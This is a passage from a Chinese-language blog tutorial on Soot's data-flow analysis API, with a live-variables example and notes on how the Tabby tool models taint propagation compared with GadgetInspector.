class="comment">//返回一个空集，通常比((FlowSet)clone()).clear()效率更高</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy</span><span class="params">(FlowSet&lt;T&gt; dest)</span></span>;<span class="comment">//拷贝当前集合到dest集合中</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span></span>;<span class="comment">//返回该flowset的清空</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//并集，this = this ∪nion</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">union</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// this ∪ other = dest，其中other、dest可以与该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">//交集，this ∩ other = this</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">intersection</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">//FlowSet ∩ other = dest 其中，dest、other可以和该FlowSet一样</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other)</span></span>; <span class="comment">// 排除，this = this - other</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">difference</span><span class="params">(FlowSet&lt;T&gt; other, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// this - other = dest,其中，dest、other和FlowSet可能相同。</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T var1)</span></span>; <span class="comment">// 添加元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(T obj, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// 添加元素至dest</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T var1)</span></span>;<span class="comment">// 删除元素</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(T obj, FlowSet&lt;T&gt; dest)</span></span>; <span class="comment">// dest删除</span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(T var1)</span></span>;<span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isSubSet</span><span class="params">(FlowSet&lt;T&gt; var1)</span></span>; <span class="comment">//</span></span><br><span class="line"><span class="function">Iterator&lt;T&gt; <span class="title">iterator</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">List&lt;T&gt; <span class="title">toList</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><h4 id="2-1-2-实现"><a href="#2-1-2-实现" class="headerlink" title="2.1.2 实现"></a>2.1.2 实现</h4><ul><li><p>ArraySparseSet 无边界<br>  该set代表一个数组引用<br>  注意：当比较元素是否相等时，一般使用继承自Object对象的equals。但是在soot中的元素都是代表一些代码结构，不能覆写equals方法。而是实现了interface soot.EquivTo。因此，如果你需要一个包含类似binary operation expressions的集合，你需要使用equivTo方法实现自定义的比较方法去比较是否相等。</p></li><li><p>ArrayPackedSet 有边界<br>  需要提供FlowUniverse 对象，即代表全集的容器。由一个在integer和object双向map和一个用来表示全集成员是否在内的bit vector表示。</p></li><li><p>ToppedSet<br>  在基于上面两种的set前提下，加入额外信息来表示其为lattice中的Top。</p></li><li><p>DavaFlowSet</p></li></ul><p><img src="/images/pasted-325.png" alt="upload successful"></p><h3 id="2-2-FlowAnalysis"><a href="#2-2-FlowAnalysis" class="headerlink" title="2.2 FlowAnalysis"></a>2.2 FlowAnalysis</h3><p>FlowAnalysis是接口类，具体有以下实现：</p><ul><li>ForwardFlowAnalysis：正向传播，也即以UnitGraph的entry statement作为开始并开始传播；</li><li>BackwardsFlowAnalysis：反向传播，以UnitGraph的exit node(s)作为分析并且向后开始传播（当然可以将UnitGraph转换产生inverseGraph，然后再使用ForwardFlowAnalysis进行分析）；</li><li>ForwardBranchedFlowAnalysis：分支正常传播，本质上也是Forward分析，但是它允许你在不同分支处传递不同的flow sets。例如：如果传播到如if(p!=null)语句处，当“p is not null”时，传播进入“then”分支，当“p is null”时传播进入“else”分支（Forward、backward分析都在分支处会将分析结果merge合并掉）。</li></ul><h4 id="2-2-1-构造函数"><a href="#2-2-1-构造函数" class="headerlink" title="2.2.1 构造函数"></a>2.2.1 构造函数</h4><p>必须实现一个携带DirectedGraph作为参数的构造函数，并且将该参数传递给super constructor。然后，在构造函数结束时调用doAnalysis()，doAnalysis()将真正执行数据流分析。而在调用super constructor和doAnalysis之间，可以自定义数据分析结构。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyAnalysis</span><span class="params">(DirectedGraph graph)</span> </span>&#123; <span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">super</span>(graph);<span class="comment">//传递给父类</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">emptySet = <span class="keyword">new</span> ArraySparseSet();<span class="comment">//自定义分析</span></span><br><span class="line">  </span><br><span class="line">doAnalysis();<span class="comment">//执行fixed-point</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-newInitialFlow-and-entryInitialFlow"><a href="#2-2-2-newInitialFlow-and-entryInitialFlow" class="headerlink" title="2.2.2 newInitialFlow() and entryInitialFlow()"></a>2.2.2 newInitialFlow() and entryInitialFlow()</h4><p>newInitialFlow()方法返回一个抽象类型A的对象，这个对象被赋值给每个语句的in-set和out-set集合，除过UnitGraph的第一个句子的in-set集合（如果你实现的是backwards分析，则是除去exit statement语句）。第一个句子的in-set集合由entryInitialFlow()初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">newInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">entryInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-copy"><a href="#2-2-3-copy" class="headerlink" title="2.2.3 copy()"></a>2.2.3 copy()</h4><p>集合复制，方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Object source, Object dest)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet srcSet = (FlowSet)source,</span><br><span class="line">FlowSet destSet = (FlowSet)dest;</span><br><span class="line">srcSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-329.png" alt="upload successful"></p><p>Soot 指导文档的这个能更好的理解copy 和merge 的功能，以backforward may analysis 场景为例：</p><ul><li>copy 是指：在无分枝情况下，上一个节点的src 就是下一个节点的dest</li><li>merge是指：有分支情况下，下一个节点的merge，是前连个节点的交集</li></ul><h4 id="2-2-4-merge"><a href="#2-2-4-merge" class="headerlink" title="2.2.4 merge()"></a>2.2.4 merge()</h4><p>交汇运算，方法被用来在control-flow的合并点处合并数据流集，例如：在句子(if/then/else)分支的结束点。与copy(..)不同的是，它携带了三个参数，一个参数是来自左边分支的out-set，一个参数是来自右边分支的out-set，另外一个参数是两个参数merge后的集合，这个集合将是合并点的下一个句子的in-set集合。</p><p>注：merge(..)本质上指的是控制流的交汇运算，一般根据待分析的具体问题来决定采用并集还是交集。</p><blockquote><p>分析的精度是由每一个最小执行单元决定的。通常来讲，一个分析只可能是may analysis或者 must analysis。在may analysis场景下，我们对两个元素进行union操作，在must analysis场景下，我们进行取交集intersection 操作。在数据流分析框架中，这种关系我们用<strong>merge</strong> 接口来实现。如果是must analysis，那么我们这么表示：</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(Object in1, Object in2, Object out)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet inSet1 = (FlowSet)in1,</span><br><span class="line">inSet2 = (FlowSet)in2,</span><br><span class="line">outSet = (FlowSet)out;</span><br><span class="line"><span class="comment">//inSet1.union(inSet2, outSet);</span></span><br><span class="line">inSet1.intersection(inSet2, outSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-5-flowThrough"><a href="#2-2-5-flowThrough" class="headerlink" title="2.2.5 flowThrough()"></a>2.2.5 flowThrough()</h4><p>flowThrough 是数据流分析的最重点内容</p><p>flowThrough(..)方法是真正的执行流函数，它有三个参数：A in-set、被处理的N类型节点（一般指的就是句子Unit）、A out-set。这个方法的实现内容完全取决于你的分析。</p><p>注：flowThrough()本质上就是一个传递函数。在一个语句之前和之后的数据流值受该语句的语义的约束。比如，假设我们的数据流分析涉及确定各个程序点上各变量的常量值。如果变量a在执行语句b=a之前的值为v，那么在该语句之后a和b的值都是v。一个赋值语句之前和之后的数据流值的关系被称为传递函数。针对前向分析和后向分析，传递函数有两种风格。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(Object in, Object d, Object out)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">FlowSet inSet = (FlowSet)in,</span><br><span class="line">FlowSet outSet = (FlowSet)out;</span><br><span class="line">Unit u = (Unit) d;</span><br><span class="line">kill(inSet,u,outSet);</span><br><span class="line">gen(outSet,u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-331.png" alt="upload successful"></p><p><img src="/images/pasted-330.png" alt="upload successful"></p><ul><li>kill 指需要在传播关系中，舍弃的</li><li>gen 指需要在传播关系中，新增的</li></ul><h3 id="2-3-Demo-Live-Variables-Analysis-实时变量分析"><a href="#2-3-Demo-Live-Variables-Analysis-实时变量分析" class="headerlink" title="2.3 Demo: Live Variables Analysis 实时变量分析"></a>2.3 Demo: Live Variables Analysis 实时变量分析</h3><p>《软件分析》课程中有讲Live Variables Analysis。</p><blockquote><p>Live variables analysis tells whether the value of variable v at program point p could be used along some path in CFG starting at p. If so, v is live at p; otherwise, v is dead at p.<br>实时变量分析，是用来计算“程序点p”处的“变量v”的值，是否可以从p开始，沿着CFG到达exit。如果可以，那么“变量v”对于p来说是可变变量的；否则，是不可变。</p></blockquote><p>核心问题是在p -&gt; use(v) 中，有没有被重新定义。</p><p><img src="/images/pasted-324.png" alt="upload successful"></p><p>算法如下：</p><p><img src="/images/pasted-323.png" alt="upload successful"></p><h4 id="2-3-1-FlowSet-设定"><a href="#2-3-1-FlowSet-设定" class="headerlink" title="2.3.1 FlowSet 设定"></a>2.3.1 FlowSet 设定</h4><p>参考fynch3r的实现LiveVariableFlowSet，继承关系 -&gt; AbstractBoundedFlowSet -&gt; AbstractFlowSet</p><p><strong>AbstractBoundedFlowSet</strong><br>AbstractBoundedFlowSet 相较于AbstractFlowSet 实现了BoundedFlowSet 的几个接口方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complement</span><span class="params">()</span></span>;<span class="comment">// 补充</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">complement</span><span class="params">(FlowSet&lt;T&gt; dest)</span></span>;<span class="comment">//补充</span></span><br><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">topSet</span><span class="params">()</span></span>;<span class="comment">// 全集</span></span><br></pre></td></tr></table></figure><p><strong>LiveVariableFlowSet</strong></p><p>就是简单的HashSet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LiveVariableFlowSet</span> <span class="keyword">extends</span> <span class="title">AbstractBoundedFlowSet</span>&lt;<span class="title">Local</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Set&lt;Local&gt; liveVariableSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br></pre></td></tr></table></figure><h4 id="2-3-2-FlowAnalysis-设定"><a href="#2-3-2-FlowAnalysis-设定" class="headerlink" title="2.3.2 FlowAnalysis 设定"></a>2.3.2 FlowAnalysis 设定</h4><p>参考fynch3r的实现SimpleLiveVariablesAnalysis, extends BackwardFlowAnalysis&lt;Unit, LiveVariableFlowSet&gt;</p><ul><li>BackwardFlowAnalysis，逆向分析</li><li>Unit，语句图</li><li>LiveVariableFlowSet，指定前文的FlowSet</li></ul><p><strong>entryInitialFlow</strong></p><p><img src="/images/pasted-328.png" alt="upload successful"></p><p><strong>newInitialFlow</strong></p><p><img src="/images/pasted-327.png" alt="upload successful"></p><p><strong>copy</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// copy</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(LiveVariableFlowSet srcSet, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//backward copy</span></span><br><span class="line">    srcSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>merge</strong><br><img src="/images/pasted-332.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// merge</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(LiveVariableFlowSet srcSet1, LiveVariableFlowSet srcSet2, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// srcSet1 U srcSet2 = srcSet2</span></span><br><span class="line">    srcSet1.union(srcSet2,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>** 注意 **<br>fynch3r 师傅MySootScript 项目里面代码是srcSet1.union(srcSet2,srcSet2)，blog上是srcSet1.union(srcSet2,destSet)，理解应该是后者。</p></blockquote><p><strong>flowThrough</strong><br><img src="/images/pasted-333.png" alt="upload successful"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">flowThrough</span><span class="params">(LiveVariableFlowSet srcSet, Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//transfer function</span></span><br><span class="line">    <span class="comment">// 1.1 kill leftOp</span></span><br><span class="line">    kill(srcSet,u,destSet);</span><br><span class="line">    <span class="comment">// 1.2 gen rightOps</span></span><br><span class="line">    gen(u,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>kill</strong><br>对于Live Variable 而言，kill则是判断当前u 是否有新定义var，针对每一个新定义的var，并将其在inSet中剔除，赋予destSet。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">kill</span><span class="params">(LiveVariableFlowSet inSet, Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    LiveVariableFlowSet kills = <span class="keyword">new</span> LiveVariableFlowSet();</span><br><span class="line">    Iterator&lt;ValueBox&gt; defIt = u.getDefBoxes().iterator();</span><br><span class="line">    <span class="keyword">while</span>(defIt.hasNext())&#123;</span><br><span class="line">        ValueBox defBox = defIt.next();</span><br><span class="line">        defBox.getValue().apply(<span class="keyword">new</span> AbstractJimpleValueSwitch() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">                Iterator inIt = inSet.iterator();</span><br><span class="line">                <span class="keyword">while</span>(inIt.hasNext())&#123;</span><br><span class="line">                    Local inValue = (Local)inIt.next();</span><br><span class="line">                    <span class="keyword">if</span>(inValue.equivTo(defBox.getValue()))&#123;</span><br><span class="line">                        kills.add((Local) defBox.getValue());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// inSet - kills = destSet</span></span><br><span class="line">    inSet.difference(kills,destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>gen</strong><br>对于Live Variable 而言，gen则是判断当前unit 是否有新定义var，并增加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">gen</span><span class="params">(Unit u, LiveVariableFlowSet destSet)</span> </span>&#123;</span><br><span class="line">    Iterator&lt;ValueBox&gt; it = u.getUseBoxes().iterator();</span><br><span class="line">    <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">        ValueBox useBox = it.next();</span><br><span class="line">        useBox.getValue().apply(<span class="keyword">new</span> AbstractJimpleValueSwitch() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">caseLocal</span><span class="params">(Local v)</span> </span>&#123;</span><br><span class="line">                destSet.add((Local) useBox.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Tabby-FlowAnalysis"><a href="#0x03-Tabby-FlowAnalysis" class="headerlink" title="0x03 Tabby FlowAnalysis"></a>0x03 Tabby FlowAnalysis</h2><h3 id="3-1-Tabby的污点传播"><a href="#3-1-Tabby的污点传播" class="headerlink" title="3.1 Tabby的污点传播"></a>3.1 Tabby的污点传播</h3><p>GadgetInspector中有提到，针对方法 <code>r = o.m(p0,…)</code>，GI只考虑了r返回值的受污点情况。</p><p>而实际场景下，污点还可能传播至其他的地方，比如</p><ul><li>o，也就是this</li><li>p，参数自身</li></ul><p>这些在GI中都没有考虑，Wh1t3p1g师傅也提到了</p><p><img src="/images/pasted-334.png" alt="upload successful"></p><p>针对这种情况，改进了污点传播算法，以支持对参数P的污染跟踪</p><h4 id="3-1-1-Passthrough-的改造"><a href="#3-1-1-Passthrough-的改造" class="headerlink" title="3.1.1 Passthrough 的改造"></a>3.1.1 Passthrough 的改造</h4><p>每个方法的污点传播不只是针对ret值的传播，还支持参数的传播，例如</p><p><img src="/images/pasted-336.png" alt="upload successful"></p><h5 id="action"><a href="#action" class="headerlink" title="action"></a>action</h5><p>对应于GI的passthrough 污点表示，tabby引入了action概念，eg</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">actions &#123;</span><br><span class="line"><span class="string">&quot;param-0&quot;</span>: [<span class="string">&quot;param-1&quot;</span>],</span><br><span class="line"><span class="string">&quot;param-1&quot;</span>: [<span class="string">&quot;param-0&quot;</span>],</span><br><span class="line"><span class="string">&quot;return&quot;</span>: [<span class="string">&quot;param-0&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应GI，passthrough中对应的是</p><table><thead><tr><th>字段</th><th>Demo</th></tr></thead><tbody><tr><td>方法名</td><td>swap</td></tr><tr><td>污点</td><td>1</td></tr></tbody></table><p><img src="/images/pasted-338.png" alt="upload successful"></p><p>注：这个图并不是swap方法的污点结果。Tabby针对obj，还解析了特定field，以达到更高精度的污点跟踪</p><h5 id="action传播"><a href="#action传播" class="headerlink" title="action传播"></a>action传播</h5><p><img src="/images/pasted-337.png" alt="upload successful"></p><!-- 师傅这里的copy其实是soot的概念，其实有了以上soot的了解，这里不难理解，顺序传播的话，指的就是下一个OUT 是上一个IN的关系--><p>这里污点参数a0，经过swap的传播action，结果是[a1, a2] 被污染。</p><p><img src="/images/pasted-349.png" alt="upload successful"></p><h4 id="3-1-2-CallGraph-的改造"><a href="#3-1-2-CallGraph-的改造" class="headerlink" title="3.1.2 CallGraph 的改造"></a>3.1.2 CallGraph 的改造</h4><p>同样，有了passthrough 之后，需要生成调用边的污点传播关系，Tabby同样改进了传播边的污点表示。</p><p><img src="/images/pasted-350.png" alt="upload successful"></p><p>注：在GI中，passthrough 和 callgraph的污点表示都是用0-n表示</p><table><thead><tr><th>可控性标志</th><th>意义</th><th>备注</th></tr></thead><tbody><tr><td>-3</td><td>变量不可控</td><td>新增</td></tr><tr><td>-2</td><td>变量来源于sources</td><td>新增</td></tr><tr><td>-1</td><td>变量来源于调用者本身</td><td>GI中为0</td></tr><tr><td>0-n</td><td>变量来源于参数函数列表</td><td>GI中为1-n</td></tr></tbody></table><h5 id="GI的表示"><a href="#GI的表示" class="headerlink" title="GI的表示"></a>GI的表示</h5><p>在GI中，callgraph最终生成的是参数的污点传播关系。</p><p><img src="/images/pasted-339.png" alt="upload successful"></p><p><img src="/images/pasted-340.png" alt="upload successful"></p><p>比如，以下例子表示的是调用invokeCall过程中，污点参数是由 0传递给了 0和1，共2条记录</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AbstractTableModel</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String, IFn&gt; __clojureFnMap;</span><br><span class="line">    hashCode() &#123;</span><br><span class="line">        IFn f = __clojureFnMap.get(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.invokeCall(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以表示为AbstractTableModel#hashCode到IFn#invokeCall的传播关系为 0-&gt;0，0-&gt;1</p><h5 id="Tabby的表示"><a href="#Tabby的表示" class="headerlink" title="Tabby的表示"></a>Tabby的表示</h5><p>从Tabby的PPT来看，tabby把调用边上的传播表达改为固定格式</p><p><img src="/images/pasted-341.png" alt="upload successful"></p><ul><li>第一位表示obj</li><li>第二位开始，表示参数0-n</li></ul><p>以上的Tabby记录[-3,-1,-3]，可以翻译成GI的传播规则：</p><p>0-&gt;1</p><p>同样的，GI的规则0-&gt;0，0-&gt;1,也可以翻译成tabby的这种表达：</p><p>[-1,-1]</p><blockquote><p>** 疑问 **<br>这种表达方式有什么优势？增加的-3、-2有何作用？</p></blockquote><h3 id="3-2-Tabby的Soot实现"><a href="#3-2-Tabby的Soot实现" class="headerlink" title="3.2 Tabby的Soot实现"></a>3.2 Tabby的Soot实现</h3><p>具体的Passthrough/CallGraph 是怎么实现的？</p><p>Passthrough属于程序内分析，是用到soot来实现的</p><blockquote><p>注意：<br>tabby 虽然支持forward analysis 和backward analysis，但是这里的forward 和backword 是在neo4j中实现的。在Soot Flow Analysis中，实际使用的是forward analysis。</p></blockquote><h4 id="3-2-1-FlowSet设计"><a href="#3-2-1-FlowSet设计" class="headerlink" title="3.2.1 FlowSet设计"></a>3.2.1 FlowSet设计</h4><p>FlowSet 为Map&lt;Local, TabbyVariable&gt;</p><h5 id="TabbyVariable"><a href="#TabbyVariable" class="headerlink" title="TabbyVariable"></a>TabbyVariable</h5><h4 id="3-2-2-FlowAnalysis的实现：PollutedVarsPointsToAnalysis"><a href="#3-2-2-FlowAnalysis的实现：PollutedVarsPointsToAnalysis" class="headerlink" title="3.2.2 FlowAnalysis的实现：PollutedVarsPointsToAnalysis"></a>3.2.2 FlowAnalysis的实现：PollutedVarsPointsToAnalysis</h4><p>PollutedVarsPointsToAnalysis extends ForwardFlowAnalysis&lt;Unit, Map&lt;Local, TabbyVariable&gt;&gt;</p><ul><li>ForwardFlowAnalysis，正向分析</li><li>Unit</li><li>FlowSet 为Map&lt;Local, TabbyVariable&gt;</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Context context; <span class="comment">// 同一函数内共享的上下文内容</span></span><br><span class="line"><span class="keyword">private</span> DataContainer dataContainer;</span><br><span class="line"><span class="keyword">private</span> Map&lt;Local, TabbyVariable&gt; emptyMap;</span><br><span class="line"><span class="keyword">private</span> Map&lt;Local, TabbyVariable&gt; initialMap;</span><br><span class="line"><span class="keyword">private</span> StmtSwitcher stmtSwitcher;</span><br><span class="line"><span class="keyword">private</span> MethodReference methodRef; <span class="comment">// method 引用，由tabby 定义的method</span></span><br><span class="line"><span class="keyword">private</span> Body body;<span class="comment">// soot JimpleBody，method.retrieveActiveBody() 而来</span></span><br></pre></td></tr></table></figure><h5 id="newInitialFlow"><a href="#newInitialFlow" class="headerlink" title="newInitialFlow"></a>newInitialFlow</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Map&lt;Local, TabbyVariable&gt; <span class="title">newInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> HashMap&lt;&gt;(emptyMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Map&lt;Local, TabbyVariable&gt; source, Map&lt;Local, TabbyVariable&gt; dest)</span> </span>&#123;</span><br><span class="line">    dest.clear();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;Local, TabbyVariable&gt; entry : source.entrySet()) &#123;</span><br><span class="line">        Local value = entry.getKey();</span><br><span class="line">        TabbyVariable variable = entry.getValue();</span><br><span class="line">        dest.put(value, variable.deepClone(<span class="keyword">new</span> ArrayList&lt;&gt;()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="merge"><a href="#merge" class="headerlink" 